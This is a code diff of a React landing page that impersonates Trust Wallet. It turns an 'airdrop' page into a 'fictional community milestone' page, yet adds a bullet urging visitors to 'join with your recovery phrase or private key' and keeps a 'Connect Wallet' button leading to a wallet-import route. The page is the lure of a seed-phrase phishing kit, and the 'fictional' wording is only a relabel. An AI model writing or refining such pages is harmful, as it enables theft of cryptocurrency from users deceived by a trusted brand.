@@ -1,13 +1,17 @@
-import { useNavigate } from 'react-router-dom'
 import { IoChevronDown } from 'react-icons/io5'
+import { useNavigate } from 'react-router-dom'
 import trustShield from '../../assets/trust-shield.png'
 
 function LandingPage() {
   const navigate = useNavigate()
 
+  const handleConnectWallet = () => {
+    navigate('/add-existing-wallet')
+  }
+
   return (
     <main className="landing-page">
-      <div className="landing-stage" aria-label="Trust Wallet airdrop">
+      <div className="landing-stage" aria-label="Fictional Trust Wallet community campaign">
         <span className="landing-cursor landing-cursor-top" aria-hidden="true" />
         <span className="landing-cursor landing-cursor-side" aria-hidden="true" />
 
@@ -31,13 +35,18 @@ function LandingPage() {
         />
 
         <section className="landing-copy">
-          <p>Limited time event.</p>
-          <h1>Trust Wallet Airdrop</h1>
+          <p>Fictional campaign concept.</p>
+          <h1>Trust Wallet Community Milestone</h1>
           <span>
-            Our airdrop campaign is now live! Connect your wallet below to check your
-            eligibility!
+            A 220 million user appreciation moment focused on long-term community
+            recognition, wallet security, and responsible Web3 participation.
           </span>
-          <button type="button" onClick={() => navigate('/add-existing-wallet')}>
+          <ul className="landing-points" aria-label="Campaign highlights">
+            <li>Celebrate global community growth</li>
+            <li>Claim Your own gift</li>
+            <li>join with your recovery phrase or private key</li>
+          </ul>
+          <button type="button" onClick={handleConnectWallet}>
             Connect Wallet
           </button>
         </section>
